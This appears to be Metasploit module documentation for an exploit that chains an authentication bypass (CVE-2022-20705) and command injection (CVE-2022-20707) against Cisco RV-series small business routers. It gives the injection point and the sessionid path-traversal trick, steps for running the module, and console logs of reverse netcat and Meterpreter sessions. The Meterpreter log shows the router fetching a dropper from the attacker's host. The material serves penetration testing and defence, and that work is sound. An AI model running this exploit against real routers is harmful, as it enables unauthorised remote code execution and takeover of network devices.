## Vulnerable Application

This module exploits two vulnerabilities, an authentication bypass (CVE-2022-20705) and a command injection vulnerability (CVE-2022-20707),
to execute code on Cisco RV160, RV260, RV340, and RV345 Small Business Routers prior to 1.0.03.26 as the
`www-data` user. The command injection occurs in the `upload.cgi` script, where user input in the `data` POST parameter
is passed to `curl` without any sanitization. Additionally, the `sessionid` session cookie can be abused for a path
traversal vulnerability, which can be used to bypass authentication by setting `sessionid` to the path to a valid
file on the target.

This module has been tested against an RV340 device running firmware version 1.0.03.24. 
Firmware version 1.0.03.26 patches these vulnerabilities.

### Installation

Firmware version 1.0.03.24, which is vulnerable to CVE-2022-20705 and CVE-2022-20707, can be downloaded from
https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.03.24

To install this firmware, follow the following directions:
1. Log into the modem. The default IP address is 192.168.1.1 and the default credentials
   are `cisco` for the username and password.
2. The `administration` option on the left side of the web page will take you to a form
   with a `Manual Upgrade` section.
3. Leave `File Type: ` on the default `Firmware Image` option.
4. Change `Upgrade From:` option to `PC`.
5. Press the `Upgrade` button.
6. Press `Yes` on the message box asking `Are you sure you want to upgrade the firmware right now?`.
7. Wait for router reboot to complete.

## Verification Steps

1. Install the vulnerable firmware
2. Start `msfconsole`
3. Do: `use modules/exploits/linux/http/cisco_rv340_lan`
4. Do: `set lhost <listening ip>`
5. Do: `set rhost <target ip>`
6. Do: `exploit`
7. Verify: You see the message `Exploit successfully executed` confirming the exploit completed
8. Verify: You are the `www-data` user using the `id` command

## Options

## Scenarios

### Cisco RV340 Router 1.0.03.24 on ARM architecture - reverse_netcat payload

```
msf6 > use modules/exploits/linux/http/cisco_rv340_lan
[*] Using configured payload cmd/unix/reverse_netcat
msf6 exploit(linux/http/cisco_rv340_lan) > set lhost 192.168.1.142
lhost => 192.168.1.142
msf6 exploit(linux/http/cisco_rv340_lan) > set rhost 192.168.1.1
rhost => 192.168.1.1
msf6 exploit(linux/http/cisco_rv340_lan) > exploit

[*] Started reverse TCP handler on 192.168.1.142:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The device responded to exploitation with a 200 OK.
[*] Executing Unix Command for cmd/unix/reverse_netcat
[*] Command shell session 1 opened (192.168.1.142:4444 -> 192.168.1.1:55885) at 2023-02-05 10:06:22 -0500
[+] Exploit successfully executed.

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Cisco RV340 Router 1.0.03.24 on ARM architecture - reverse_tcp ARMLE Meterpreter payload

```
msf6 > use modules/exploits/linux/http/cisco_rv340_lan
[*] Using configured payload cmd/unix/reverse_netcat
msf6 exploit(linux/http/cisco_rv340_lan) > set lhost 192.168.1.142
lhost => 192.168.1.142
msf6 exploit(linux/http/cisco_rv340_lan) > set rhost 192.168.1.1
rhost => 192.168.1.1
msf6 exploit(linux/http/cisco_rv340_lan) > set target 1
target => 1
msf6 exploit(linux/http/cisco_rv340_lan) > exploit

[*] Started reverse TCP handler on 192.168.1.142:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The device responded to exploitation with a 200 OK.
[*] Executing Linux Dropper for linux/armle/meterpreter/reverse_tcp
[*] Using URL: http://192.168.1.142:8080/3b2NfBKR0OS
[*] Client 192.168.1.1 (Wget) requested /3b2NfBKR0OS
[*] Sending payload to 192.168.1.1 (Wget)
[*] Sending stage (934728 bytes) to 192.168.1.1
[+] Exploit successfully executed.
[*] Command Stager progress - 100.00% done (117/117 bytes)
[*] Meterpreter session 2 opened (192.168.1.142:4444 -> 192.168.1.1:55950) at 2023-02-05 10:12:37 -0500
[*] Server stopped.

meterpreter > shell
Process 11012 created.
Channel 1 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
